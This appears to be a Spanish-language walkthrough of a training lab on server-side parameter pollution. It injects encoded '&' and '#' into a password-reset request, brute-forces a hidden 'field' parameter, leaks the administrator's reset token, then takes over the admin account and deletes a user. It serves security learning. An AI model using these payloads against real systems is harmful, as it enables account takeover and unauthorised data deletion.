
---

## 🧪 Lab: Explotación de Server-Side Parameter Pollution en Query String

**Objetivo**: Iniciar sesión como **administrator** y eliminar al usuario **carlos**.

---

### 🔐 1. Trigger del reset de contraseña

- Ir al navegador de Burp.
    
- Iniciar el proceso de "¿Olvidaste tu contraseña?" para el usuario `administrator`.
    
- En **Proxy > HTTP history**, observar:
    
    - `POST /forgot-password`
        
    - `GET /static/js/forgotPassword.js`
        

---

### 📤 2. Analizar la solicitud POST

- Enviar `POST /forgot-password` al **Repeater**.
    
- En Repeater:
    
    - Confirmar que el request con `username=administrator` da respuesta normal.
        ![[Pasted image 20250505224307.png]]
    - Probar con `username=administratorx` → da error `Invalid username`.
        ![[Pasted image 20250505225647.png]]

---

### 💉 3. Probar inyección de parámetro con `%26` (`&` codificado)

- Probar:
    
    ```
    username=administrator%26x=y
    ```
    
    Resultado: `Parameter is not supported` → 💡 hay un intento de interpretar `x=y` como parámetro válido.
    ![[Pasted image 20250505230855.png]]

---

### ✂️ 4. Probar truncamiento con `%23` (`#` codificado)

- Probar:
    
    ```
    username=administrator%23
    ```
    
    Resultado: `Field not specified` → 💡 se eliminó probablemente un campo requerido.
    ![[Pasted image 20250505231013.png]]

---

### 🧪 5. Inyectar y truncar parámetro `field`

- Probar:
    
    ```
    username=administrator%26field=x%23
    ```
    
    Resultado: `Invalid field` → 💡 el campo `field` es reconocido.
    ![[Pasted image 20250505231138.png]]

---

### 🔁 6. Fuerza bruta de `field`

- Enviar a **Intruder**:
    
    - Payload:
        
        ```
        username=administrator%26field=§x§%23
        ```
        
    - Lista: `Server-side variable names`
        
    - Resultado: `email` y `username` dan respuesta 200.
        ![[Pasted image 20250505231824.png]]

---

### 🧠 7. Buscar token de reseteo

- En `/static/js/forgotPassword.js` aparece:
    
    ```
    /forgot-password?reset_token=${resetToken}
    ```
    
- En Repeater, probar:
    
    ```
    username=administrator%26field=reset_token%23
    ```
    
- 💥 Se obtiene el `reset_token`.
    ![[Pasted image 20250505232605.png]]
```css
{
  "type":"reset_token",
  "result":"<token>"
}
```

---

### 🔑 8. Resetear contraseña del administrador

- En el navegador:
    
    ```
    /forgot-password?reset_token=<token>
    ```
    
- Establecer nueva contraseña.
    ![[Pasted image 20250505232944.png]]

---

### ✅ 9. Iniciar sesión como `administrator`

- Entrar al panel de administración.
    
- Eliminar al usuario `carlos`.
    

✅ **¡Lab resuelto!**
![[Pasted image 20250505233102.png]]
---

